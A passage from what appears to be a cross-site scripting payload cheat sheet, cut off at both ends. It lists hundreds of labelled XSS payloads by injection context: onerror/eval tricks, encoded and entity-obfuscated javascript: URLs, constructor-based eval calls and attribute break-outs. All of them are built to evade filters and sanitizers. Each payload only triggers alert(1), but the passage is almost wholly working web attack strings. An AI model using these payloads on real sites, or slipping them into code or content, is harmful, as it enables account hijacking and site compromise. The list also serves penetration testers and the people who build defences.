)((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>`
window.name with onerror and throw
`<script>throw onerror=eval,name</script>`
location with onerror and throw
`<script>throw onerror=eval,'/*'+location</script>`
SVG with onerror, throw and document.URL
`<svg onload="throw top.onerror=eval,'/*'+URL">`
body with onerror, throw and location
`<body onload="throw onerror=eval,'/*'+location">`
ondevicemotion and URIError object
`<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>`
ondeviceorientation and Error object
`<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\x281\x29'</script>`
ondeviceorientationabsolute and WebTransportError object
`<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>`
onpagereveal and AggregateError object
`<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>`
onpageswap and EvalError object
`<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>`
onmessage and RangeError object
`<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name="alert\x281\x29">';target.onload=setTimeout(function(){frames[0].postMessage("", "*")},100)</script>`
onhashchange and Regex object
`<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29';Event.prototype.toString=/x/.toString</script>`
onscroll and ReferenceError object
`<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>`
onscrollend and SyntaxError object
`<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>`
onselect and TypeError object
`<input value=x autofocus onfocus="window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\x281\x29'">`
ontransitionstart / ontransitionend / ontransitionrun and Arrow function
`<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'">`
onload and DOMException object
`<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'">`
onpageshow and WebTransportError object
`<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>`
onerror and ReferenceError without throw
`<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>`
SVG onerror and XSS new constructor
`<svg onload=onerror=eval;new'"-alert\x281\x29//'>`
onerror and new operator on window name
`<script>onerror=eval,new name</script>`
onerror and Error object on Firefox and Safari
`<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>`
onerror and Error object on Chrome
`<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\x281\x29',x</script>`
Redefining onerror and concealing the payload in attributes
`<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>`
Attributes and SVG with payload concealed in window name
`<script>window.name='alert(1)';</script><svg onload="attributes[0].value=name,new onload">`
Attributes and SVG and onload event with payload concealed in URL and template strings
`` <svg onload="attributes[0].value=id+URL+id,new onload" id=`> ``})
Attributes and input with onfocus event with payload concealed in URL and template strings
`` <input onfocus="attributes[0].value=id+URL+id,new onfocus" id=` autofocus> ``})
Attributes and input with onclick event with payload concealed in URL and template strings requires two clicks
`` <input onclick=attributes[0].value='`'+URL+'`'> ``})
Form action and input with payload concealed in window name
`<form><input onclick="formAction=top.name,type='submit',new submit">`
SVG and innerHTML to decode the URL then assign it with textContent payload concealed in URL
`<svg onload=innerHTML=URL,innerHTML=textContent>`&gt;)
img and innerHTML to decode the URL then assign it with textContent payload concealed in URL
`<img/src/onerror=innerHTML=URL,innerHTML=textContent>`&gt;)
innerHTML to decode the URL then eval it using textContent payload concealed in URL
`<svg onload=innerHTML=URL,eval(textContent)>`)
innerHTML and outerHTML to avoid use of greater than
`<svg onload=outerHTML=id id=<img/src/onerror=alert(1)&gt;`
U+2028 separator (js\_comment)
` alert(1)`
U+2029 separator (js\_comment)
` alert(1)`
prompt() (js\_string\_single)
`'-prompt(1)-'`
confirm() (js\_string\_single)
`'-confirm(1)-'`
window\[\] access (js\_string\_single)
`'-window['a'+'lert'](1)-'`
template-literal \`a\` string + window\[\] access (js\_string\_single)
`` '-window[`a`+'lert'](1)-' ``
Unicode escape (js\_string\_single)
`'-\u0061lert(1)-'`
ES6 unicode escape (js\_string\_single)
`'-\u{0061}lert(1)-'`
ES6 unicode escape no zeros (js\_string\_single)
`'-\u{61}lert(1)-'`
ES6 unicode escape padded zeros (js\_string\_single)
`'-\u{00000000000061}lert(1)-'`
self\[\] access (js\_string\_single)
`'-self['a'+'lert'](1)-'`
template-literal \`a\` string + self\[\] access (js\_string\_single)
`` '-self[`${`a`}lert`](1)-' ``
\\a literal in string + self\[\] access (js\_string\_single)
`'-self['\a'+'lert'](1)-'`
\\x61 escape + self\[\] access (js\_string\_single)
`'-self['\x61'+'lert'](1)-'`
\\141 octal escape + self\[\] access (js\_string\_single)
`'-self['\141'+'lert'](1)-'`
/a/.source + self\[\] access (js\_string\_single)
`'-self[/a/.source+/lert/.source](1)-'`
atob.name\[0\] + self\[\] access (js\_string\_single)
`'-self[atob.name[0]+'lert'](1)-'`
atob.name\[0\] + self\[\] access (js\_string\_single) #2
`'-self[atob.name[0]+'lert'](1)-'`
String.fromCharCode(0x61) + self\[\] access (js\_string\_single)
`'-self[String.fromCharCode(0x61)+'lert'](1)-'`
String.fromCodePoint(0x61) + self\[\] access (js\_string\_single)
`'-self[String.fromCodePoint(0x61)+'lert'](1)-'`
10..toString(17) + self\[\] access (js\_string\_single)
`'-self[10..toString(17)+'lert'](1)-'`
10n.toString(17) + self\[\] access (js\_string\_single)
`'-self[10n.toString(17)+'lert'](1)-'`
0xa.toString(17) + self\[\] access (js\_string\_single)
`'-self[0xa.toString(17)+'lert'](1)-'`
0b1010.toString(17) + self\[\] access (js\_string\_single)
`'-self[0b1010.toString(17)+'lert'](1)-'`
0o12.toString(17) + self\[\] access (js\_string\_single)
`'-self[0o12.toString(17)+'lert'](1)-'`
atob('YQ==') + self\[\] access (js\_string\_single)
`'-self[atob('YQ==')+'lert'](1)-'`
unescape('%61') + self\[\] access (js\_string\_single)
`'-self[unescape('%61')+'lert'](1)-'`
decodeURI('%61') + self\[\] access (js\_string\_single)
`'-self[decodeURI('%61')+'lert'](1)-'`
decodeURIComponent('%61') + self\[\] access (js\_string\_single)
`'-self[decodeURIComponent('%61')+'lert'](1)-'`
+\[\] coercion + self\[\] access (js\_string\_single)
`'-self['a'+[]+'lert'](1)-'`
frames\[\] access (js\_string\_single)
`'-frames['a'+'lert'](1)-'`
globalThis\[\] access (js\_string\_single)
`'-globalThis['a'+'lert'](1)-'`
top\[\] access (js\_string\_single)
`'-top['a'+'lert'](1)-'`
parent\[\] access (js\_string\_single)
`'-parent['a'+'lert'](1)-'`
this\[\] access (js\_string\_single)
`'-this['a'+'lert'](1)-'`
alert\`...\` template (js\_string\_single)
`` '-alert`1`-' ``
; separator + throw onerror=alert (js\_string\_single)
`';throw onerror=alert,1;'`
LF separator + throw onerror=alert (js\_string\_single)
`'\
throw onerror=alert,1\
'`
U+2028 separator + throw onerror=alert (js\_string\_single)
`' throw onerror=alert,1 '`
U+2029 separator + throw onerror=alert (js\_string\_single)
`' throw onerror=alert,1 '`
location=name (js\_string\_single)
`'-[location=name]-'`
location.href=name (js\_string\_single)
`'-[location.href=name]-'`
location=javascript: %XX paren (js\_string\_single)
`'-[location='javascript:alert%281%29']-'`
location=javascript: \\xNN paren (js\_string\_single)
`'-[location='javascript:alert\x281\x29']-'`
location=javascript: \\u paren + \\u0028 escape (js\_string\_single)
`'-[location='javascript:alert\u00281\u0029']-'`
location=javascript: octal paren (js\_string\_single)
`'-[location='javascript:alert\501\51']-'`
Symbol.hasInstance+eval (js\_string\_single)
`'-['alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}]-'`
alternative JS syntax (event\_handler\_js\_string\_single)
`'-alert(1)-'`
&apos; entity quote (event\_handler\_js\_string\_single)
`&apos;-alert(1)-&apos;`
&#x27; entity quote (with ;) (event\_handler\_js\_string\_single)
`&#x27;-alert(1)-&#x27;`
&#39; entity quote (with ;) (event\_handler\_js\_string\_single)
`&#39;-alert(1)-&#39;`
&#x27 entity quote (no ;) (event\_handler\_js\_string\_single)
`&#x27-alert(1)-&#x27`
&#39 entity quote (no ;) (event\_handler\_js\_string\_single)
`&#39-alert(1)-&#39`
javascript: URL (attribute\_href)
`javaScript:alert(1)`
javascript: URL via raw newline (inline) (attribute\_href)
`java\
script:alert(1)`
javascript: URL via raw tab (inline) (attribute\_href)
`java	script:alert(1)`
javascript: URL via &colon; entity (attribute\_href)
`javascript&colon;alert(1)`
javascript: URL via &#58; entity (inline, with ;) (attribute\_href)
`javascript&#58;alert(1)`
javascript: URL via &#58 entity in JS + &#58; entity (inline, no ;) (attribute\_href)
`javascript&#58alert(1)`
javascript: URL via &#x3a; entity (inline, with ;) (attribute\_href)
`javascript&#x3a;alert(1)`
javascript: URL via &#x3a; entity (inline, no ;) (attribute\_href)
`javascript&#x3a-alert(1)`
javascript: URL via &NewLine; entity (inline) (attribute\_href)
`java&NewLine;script:alert(1)`
javascript: URL via &Tab; entity (inline) (attribute\_href)
`java&Tab;script:alert(1)`
javascript: URL via &#x9; entity (inline, with ;) (attribute\_href)
`java&#x9;script:alert(1)`
javascript: URL via &#x00000000000009; entity (inline, with ;) (attribute\_href)
`java&#x00000000000009;script:alert(1)`
javascript: URL via &#9; entity (inline, with ;) (attribute\_href)
`java&#9;script:alert(1)`
javascript: URL via &#00000000000009; entity (inline, with ;) (attribute\_href)
`java&#00000000000009;script:alert(1)`
javascript: URL via &#x9; entity (inline, no ;) (attribute\_href)
`java&#x9script:alert(1)`
javascript: URL via &#x00000000000009; entity (inline, no ;) (attribute\_href)
`java&#x00000000000009script:alert(1)`
javascript: URL via &#9; entity (inline, no ;) (attribute\_href)
`java&#9script:alert(1)`
javascript: URL via &#00000000000009; entity (inline, no ;) (attribute\_href)
`java&#00000000000009script:alert(1)`
javascript: URL via &NewLine; entity (prefix) (attribute\_href)
`&NewLine;javascript:alert(1)`
javascript: URL via &Tab; entity (prefix) (attribute\_href)
`&Tab;javascript:alert(1)`
javascript: URL via raw newline (prefix) (attribute\_href)
`\
javascript:alert(1)`
javascript: URL via %09 tab prefix (attribute\_href)
`%09javascript:alert(1)`
javascript: URL via space prefix (attribute\_href)
`%20javascript:alert(1)`
javascript: URL via &#1; entity (prefix, with ;) (attribute\_href)
`&#1;javascript:alert(1)`
javascript: URL via &#2; entity (prefix, with ;) (attribute\_href)
`&#2;javascript:alert(1)`
javascript: URL via &#3; entity (prefix, with ;) (attribute\_href)
`&#3;javascript:alert(1)`
javascript: URL via &#4; entity (prefix, with ;) (attribute\_href)
`&#4;javascript:alert(1)`
javascript: URL via &#5; entity (prefix, with ;) (attribute\_href)
`&#5;javascript:alert(1)`
javascript: URL via &#6; entity (prefix, with ;) (attribute\_href)
`&#6;javascript:alert(1)`
javascript: URL via &#7; entity (prefix, with ;) (attribute\_href)
`&#7;javascript:alert(1)`
javascript: URL via &#8; entity (prefix, with ;) (attribute\_href)
`&#8;javascript:alert(1)`
javascript: URL via &#9; entity (prefix, with ;) (attribute\_href)
`&#9;javascript:alert(1)`
javascript: URL via &#10; entity (prefix, with ;) (attribute\_href)
`&#10;javascript:alert(1)`
javascript: URL via &#11; entity (prefix, with ;) (attribute\_href)
`&#11;javascript:alert(1)`
javascript: URL via &#12; entity (prefix, with ;) (attribute\_href)
`&#12;javascript:alert(1)`
javascript: URL via &#13; entity (prefix, with ;) (attribute\_href)
`&#13;javascript:alert(1)`
javascript: URL via &#14; entity (prefix, with ;) (attribute\_href)
`&#14;javascript:alert(1)`
javascript: URL via &#15; entity (prefix, with ;) (attribute\_href)
`&#15;javascript:alert(1)`
javascript: URL via &#16; entity (prefix, with ;) (attribute\_href)
`&#16;javascript:alert(1)`
javascript: URL via &#17; entity (prefix, with ;) (attribute\_href)
`&#17;javascript:alert(1)`
javascript: URL via &#18; entity (prefix, with ;) (attribute\_href)
`&#18;javascript:alert(1)`
javascript: URL via &#19; entity (prefix, with ;) (attribute\_href)
`&#19;javascript:alert(1)`
javascript: URL via &#20; entity (prefix, with ;) (attribute\_href)
`&#20;javascript:alert(1)`
javascript: URL via &#21; entity (prefix, with ;) (attribute\_href)
`&#21;javascript:alert(1)`
javascript: URL via &#22; entity (prefix, with ;) (attribute\_href)
`&#22;javascript:alert(1)`
javascript: URL via &#23; entity (prefix, with ;) (attribute\_href)
`&#23;javascript:alert(1)`
javascript: URL via &#24; entity (prefix, with ;) (attribute\_href)
`&#24;javascript:alert(1)`
javascript: URL via &#25; entity (prefix, with ;) (attribute\_href)
`&#25;javascript:alert(1)`
javascript: URL via &#26; entity (prefix, with ;) (attribute\_href)
`&#26;javascript:alert(1)`
javascript: URL via &#27; entity (prefix, with ;) (attribute\_href)
`&#27;javascript:alert(1)`
javascript: URL via &#28; entity (prefix, with ;) (attribute\_href)
`&#28;javascript:alert(1)`
javascript: URL via &#29; entity (prefix, with ;) (attribute\_href)
`&#29;javascript:alert(1)`
javascript: URL via &#30; entity (prefix, with ;) (attribute\_href)
`&#30;javascript:alert(1)`
javascript: URL via &#31; entity (prefix, with ;) (attribute\_href)
`&#31;javascript:alert(1)`
javascript: URL via &#x1; entity (prefix, with ;) (attribute\_href)
`&#x1;javascript:alert(1)`
javascript: URL via &#x2; entity (prefix, with ;) (attribute\_href)
`&#x2;javascript:alert(1)`
javascript: URL via &#x3; entity (prefix, with ;) (attribute\_href)
`&#x3;javascript:alert(1)`
javascript: URL via &#x4; entity (prefix, with ;) (attribute\_href)
`&#x4;javascript:alert(1)`
javascript: URL via &#x5; entity (prefix, with ;) (attribute\_href)
`&#x5;javascript:alert(1)`
javascript: URL via &#x6; entity (prefix, with ;) (attribute\_href)
`&#x6;javascript:alert(1)`
javascript: URL via &#x7; entity (prefix, with ;) (attribute\_href)
`&#x7;javascript:alert(1)`
javascript: URL via &#x8; entity (prefix, with ;) (attribute\_href)
`&#x8;javascript:alert(1)`
javascript: URL via &#x9; entity (prefix, with ;) (attribute\_href)
`&#x9;javascript:alert(1)`
javascript: URL via &#xa; entity (prefix, with ;) (attribute\_href)
`&#xa;javascript:alert(1)`
javascript: URL via &#xb; entity (prefix, with ;) (attribute\_href)
`&#xb;javascript:alert(1)`
javascript: URL via &#xc; entity (prefix, with ;) (attribute\_href)
`&#xc;javascript:alert(1)`
javascript: URL via &#xd; entity (prefix, with ;) (attribute\_href)
`&#xd;javascript:alert(1)`
javascript: URL via &#xe; entity (prefix, with ;) (attribute\_href)
`&#xe;javascript:alert(1)`
javascript: URL via &#xf; entity (prefix, with ;) (attribute\_href)
`&#xf;javascript:alert(1)`
javascript: URL via &#x10; entity (prefix, with ;) (attribute\_href)
`&#x10;javascript:alert(1)`
javascript: URL via &#x11; entity (prefix, with ;) (attribute\_href)
`&#x11;javascript:alert(1)`
javascript: URL via &#x12; entity (prefix, with ;) (attribute\_href)
`&#x12;javascript:alert(1)`
javascript: URL via &#x13; entity (prefix, with ;) (attribute\_href)
`&#x13;javascript:alert(1)`
javascript: URL via &#x14; entity (prefix, with ;) (attribute\_href)
`&#x14;javascript:alert(1)`
javascript: URL via &#x15; entity (prefix, with ;) (attribute\_href)
`&#x15;javascript:alert(1)`
javascript: URL via &#x16; entity (prefix, with ;) (attribute\_href)
`&#x16;javascript:alert(1)`
javascript: URL via &#x17; entity (prefix, with ;) (attribute\_href)
`&#x17;javascript:alert(1)`
javascript: URL via &#x18; entity (prefix, with ;) (attribute\_href)
`&#x18;javascript:alert(1)`
javascript: URL via &#x19; entity (prefix, with ;) (attribute\_href)
`&#x19;javascript:alert(1)`
javascript: URL via &#x1a; entity (prefix, with ;) (attribute\_href)
`&#x1a;javascript:alert(1)`
javascript: URL via &#x1b; entity (prefix, with ;) (attribute\_href)
`&#x1b;javascript:alert(1)`
javascript: URL via &#x1c; entity (prefix, with ;) (attribute\_href)
`&#x1c;javascript:alert(1)`
javascript: URL via &#x1d; entity (prefix, with ;) (attribute\_href)
`&#x1d;javascript:alert(1)`
javascript: URL via &#x1e; entity (prefix, with ;) (attribute\_href)
`&#x1e;javascript:alert(1)`
javascript: URL via &#x1f; entity (prefix, with ;) (attribute\_href)
`&#x1f;javascript:alert(1)`
atob.constructor() (js\_string\_single)
`'-atob.constructor('a'+'lert(1)')()-'`
btob.constructor() (js\_string\_single)
`'-btob.constructor('a'+'lert(1)')()-'`
Ink.constructor() (js\_string\_single)
`'-Ink.constructor('a'+'lert(1)')()-'`
HID.constructor() (js\_string\_single)
`'-HID.constructor('a'+'lert(1)')()-'`
GPU.constructor() (js\_string\_single)
`'-GPU.constructor('a'+'lert(1)')()-'`
when.constructor() (js\_string\_single)
`'-when.constructor('a'+'lert(1)')()-'`
find.constructor() (js\_string\_single)
`'-find.constructor('a'+'lert(1)')()-'`
print.constructor() (js\_string\_single)
`'-print.constructor('a'+'lert(1)')()-'`
Set.constructor() (js\_string\_single)
`'-Set.constructor('a'+'lert(1)')()-'`
Object constructor.constructor() (js\_string\_single)
`'-{}.constructor.constructor('a'+'lert(1)')()-'`
String constructor.constructor() (js\_string\_single)
`'-''.constructor.constructor('a'+'lert(1)')()-'`
Array constructor.constructor() (js\_string\_single)
`'-[].constructor.constructor('a'+'lert(1)')()-'`
Number constructor.constructor() (js\_string\_single)
`'-0..constructor.constructor('a'+'lert(1)')()-'`
Bigint constructor.constructor() (js\_string\_single)
`'-0n.constructor.constructor('a'+'lert(1)')()-'`
createElement('script')+append (js\_string\_single)
`'-[s=document.createElement('script'),s.append('a'+'lert(1)'),document.documentElement.append(s)]-'`
location.replace(javascript:) (js\_string\_single)
`'-location.replace('javascript:a\lert(1)')-'`
location='javascript:a\\lert(1)' (js\_string\_single)
`'-[location='javascript:a\lert(1)']-'`
attribute break-out with onfocus (slash-sep) +tabindex +autofocus (attribute\_double)
`"/onfocus=alert(1) tabindex=1 autofocus/`
attribute break-out with onfocusin (slash-sep) +tabindex +autofocus (attribute\_double)
`"/onfocusin=alert(1) tabindex=1 autofocus/`
attribute break-out with onmousemove (slash-sep) (attribute\_double)
`"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmouseenter (slash-sep) (attribute\_double)
`"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerenter (slash-sep) (attribute\_double)
`"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointermove (slash-sep) (attribute\_double)
`"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerover (slash-sep) (attribute\_double)
`"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerrawupdate (slash-sep) (attribute\_double)
`"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmousedown (slash-sep) (attribute\_double)
`"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmouseup (slash-sep) (attribute\_double)
`"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerdown (slash-sep) (attribute\_double)
`"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerdown (slash-sep) (attribute\_double) #2
`"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onfocus (slash-sep) +autofocus (attribute\_double)
`"/onfocus=alert(1) autofocus/`
attribute break-out with onfocusin (slash-sep) +autofocus (attribute\_double)
`"/onfocusin=alert(1) autofocus/`
attribute break-out with onmousemove (slash-sep) (attribute\_double) #2
`"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmouseenter (slash-sep) (attribute\_double) #2
`"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerenter (slash-sep) (attribute\_double) #2
`"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointermove (slash-sep) (attribute\_double) #2
`"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerover (slash-sep) (attribute\_double) #2
`"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerrawupdate (slash-sep) (attribute\_double) #2
`"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmousedown (slash-sep) (attribute\_double) #2
`"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmouseup (slash-sep) (attribute\_double) #2
`"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerdown (slash-sep) (attribute\_double) #3
`"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerdown (slash-sep) (attribute\_double) #4
`"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onfocus (unquoted) +autofocus (attribute\_unquoted)
`1 onfocus=alert(1) autofocus/`
attribute break-out with onfocusin (unquoted) +autofocus (attribute\_unquoted)
`1 onfocusin=alert(1) autofocus/`
attribute break-out with onmousemove (unquoted) (attribute\_unquoted)
`1 onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmouseenter (unquoted) (attribute\_unquoted)
`1 onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerenter (unquoted) (attribute\_unquoted)
`1 onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointermove (unquoted) (attribute\_unquoted)
`1 onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerover (unquoted) (attribute\_unquoted)
`1 onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerrawupdate (unquoted) (attribute\_unquoted)
`1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerrawupdate (unquoted) (attribute\_unquoted) #2
`1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onmouseup (unquoted) (attribute\_unquoted)
`1 onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onpointerdown (unquoted) (attribute\_unquoted)
`1 onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /`
attribute break-out with onfocus (quoted-handler) +autofocus (attribute\_double)
`"onfocus="alert(1)"/autofocus/`
attribute break-out with onfocusin (quoted-handler) +autofocus (attribute\_double)
`"onfocusin="alert(1)"/autofocus/`
attribute break-out with onmousemove (quoted-handler) (attribute\_double)
`"onmousemove="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onmouseenter (quoted-handler) (attribute\_double)
`"onmouseenter="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onpointerenter (quoted-handler) (attribute\_double)
`"onpointerenter="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onpointermove (quoted-handler) (attribute\_double)
`"onpointermove="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onpointerover (quoted-handler) (attribute\_double)
`"onpointerover="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onpointerrawupdate (quoted-handler) (attribute\_double)
`"onpointerrawupdate="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onmouseup (quoted-handler) (attribute\_double)
`"onmouseup="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
attribute break-out with onpointerdown (quoted-handler) (attribute\_double)
`"onpointerdown="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /`
javascript: URL (iframe\_src)
`" srcdoc="<xss tabindex=1 autofocus onfocusin=alert(1)>"`
<xss> with onfocus using atob.constructor() (html)
`<xss tabindex=1 autofocus onfocus=atob.constructor('a'+'lert(1)')()>`
<xss> with onfocus using btob.constructor() (html)
`<xss tabindex=1 autofocus onfocus=btob.constructor('a'+'lert(1)')()>`
<xss> with onfocus using Ink.constructor() (html)
`<xss tabindex=1 autofocus onfocus=Ink.constructor('a'+'lert(1)')()>`
<xss> with onfocus using HID.constructor() (html)
`<xss tabindex=1 autofocus onfocus=HID.constructor('a'+'lert(1)')()>`
<xss> with onfocus using GPU.constructor() (html)
`<xss tabindex=1 autofocus onfocus=GPU.constructor('a'+'lert(1)')()>`
<xss> with onfocus using when.constructor() (html)
`<xss tabindex=1 autofocus onfocus=when.constructor('a'+'lert(1)')()>`
<xss> with onfocus using find.constructor() (html)
`<xss tabindex=1 autofocus onfocus=find.constructor('a'+'lert(1)')()>`
<xss> with onfocus using print.constructor() (html)
`<xss tabindex=1 autofocus onfocus=print.constructor('a'+'lert(1)')()>`
<xss> with onfocus using Set.constructor() (html)
`<xss tabindex=1 autofocus onfocus=Set.constructor('a'+'lert(1)')()>`
<xss> with onfocus using Object constructor.constructor() (html)
`<xss tabindex=1 autofocus onfocus={}.constructor.constructor('a'+'lert(1)')()>`
<xss> with onfocus using String constructor.constructor() (html)
`<xss tabindex=1 autofocus onfocus=''.constructor.constructor('a'+'lert(1)')()>`
<xss> with onfocus using Array constructor.constructor() (html)
`<xss tabindex=1 autofocus onfocus=[].constructor.constructor('a'+'lert(1)')()>`
<xss> with onfocus using Number constructor.constructor() (html)
`<xss tabindex=1 autofocus onfocus=0..constructor.constructor('a'+'lert(1)')()>`
<xss> with onfocus using Bigint constructor.constructor() (html)
`<xss tabindex=1 autofocus onfocus=0n.constructor.constructor('a'+'lert(1)')()>`
<xss> with onfocus using createElement('script')+append (html)
`<xss tabindex=1 autofocus onfocus=s=createElement('script'),s.append('a'+'lert(1)'),this.append(s)>`
<xss> with onfocus using location.replace(javascript:) (html)
`<xss tabindex=1 autofocus onfocus=location.replace('javascript:a\lert(1)')>`
<xss> with onfocus using location='javascript:a\\lert(1)' (html)
`<xss tabindex=1 autofocus onfocus=location='javascript:a\lert(1)'>`
<xss> with onfocus using location=self.name (html)
`<xss tabindex=1 autofocus onfocus=location=self.name>`
<xss> with onfocus using location=frames.name (html)
`<xss tabindex=1 autofocus onfocus=location=frames.name>`
<xss> with onfocus using location=globalThis.name (html)
`<xss tabindex=1 autofocus onfocus=location=globalThis.name>`
<xss> with onfocus using location=globalThis.name (html) #2
`<xss tabindex=1 autofocus onfocus=location=globalThis.name>`
<xss> with onerror+onfocus using throw self.onerror=alert + /\*\*/ comment as space + &#97 entity in JS (html)
`<xss tabindex=1 autofocus onfocus=throw/**/self.onerror=&#97lert,1>`
<xss> with onerror+onfocus using throw frames.onerror=alert + /\*\*/ comment as space + &#97 entity in JS (html)
`<xss tabindex=1 autofocus onfocus=throw/**/frames.onerror=&#97lert,1>`
<xss> with onerror+onfocus using throw globalThis.onerror=alert + /\*\*/ comment as space + &#97 entity in JS (html)
`<xss tabindex=1 autofocus onfocus=throw/**/globalThis.onerror=&#97lert,1>`
<xss> with onerror+onfocus using throw self.onerror=alert + &#97 entity in JS + quoted handler value (html)
`<xss tabindex=1 autofocus onfocus="throw self.onerror=&#97lert,1">`
<xss> with onerror+onfocus using throw frames.onerror=alert + &#97 entity in JS + quoted handler value (html)
`<xss tabindex=1 autofocus onfocus="throw frames.onerror=&#97lert,1">`
<xss> with onerror+onfocus using throw globalThis.onerror=alert + &#97 entity in JS + quoted handler value (html)
`<xss tabindex=1 autofocus onfocus="throw globalThis.onerror=&#97lert,1">`
<xss> with onerror+onfocus using throw defaultView.onerror=alert + &#97 entity in JS + quoted handler value (html)
